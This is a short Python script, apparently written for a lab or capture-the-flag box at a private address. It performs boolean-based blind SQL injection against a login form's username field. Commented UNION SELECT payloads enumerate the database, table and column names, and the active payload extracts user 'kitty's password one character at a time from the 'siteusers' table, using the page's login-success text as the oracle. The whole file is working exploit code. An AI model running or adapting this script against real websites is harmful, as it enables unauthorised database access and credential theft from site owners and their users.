import requests
import sys

##Define function and pass URL

def dataname(url):
    ##Define character list to be used.
    ##To enumerate columns, remove the first letter found and replace it at the end, for example, if column 'alpha' is found, remove 'a' from charset and replace it at the end.
    charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'
    
    ##Define length of charset, set i to 0 and set char to blank by default.
    length = len(charset)
    i = 0
    char = ""

    ##While i is less than the length of the given charset.
    while i < length:
        ##Data taken from curl request to target website. Username replaced with SQL injection.
        data = {
            #ENUMERATE DATABASE NAME: 'username':"' UNION SELECT 1,2,3,4 WHERE database() LIKE BINARY '" + char + charset[i] + "%' -- -",
            #ENUMERATE TABLE NAME: 'username':"' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE BINARY '" + char + charset[i] + "%' -- -",
            #ENUMERATE COLUMN NAME: 'username':"' UNION SELECT 1,2,3,4 FROM information_schema.columns WHERE table_schema='mywebsite' AND table_name='siteusers' AND column_name LIKE BINARY '" + char + charset[i] + "%' -- -",
            'username':"' UNION SELECT 1,2,3,4 FROM siteusers WHERE username LIKE BINARY 'kitty' AND password LIKE BINARY '" + char + charset[i] + "%' -- -",
            'password':'a'
        }
        ##Make post request to the URL with provided data.
        req = requests.post(url,data=data)

        ##If login is successful, then accept the first char and start again.
        if "Hello there!" in req.text:
            char = char + charset[i]
            i = 0
        
        ##If login is unsuccessful, keep going through the list. 
        else:
            sys.stdout.write(f"\rExtracting {char}{charset[i]}")
            sys.stdout.flush()
            i += 1

if __name__== "__main__":
   url = "http://10.10.216.128/index.php"
   dataname(url)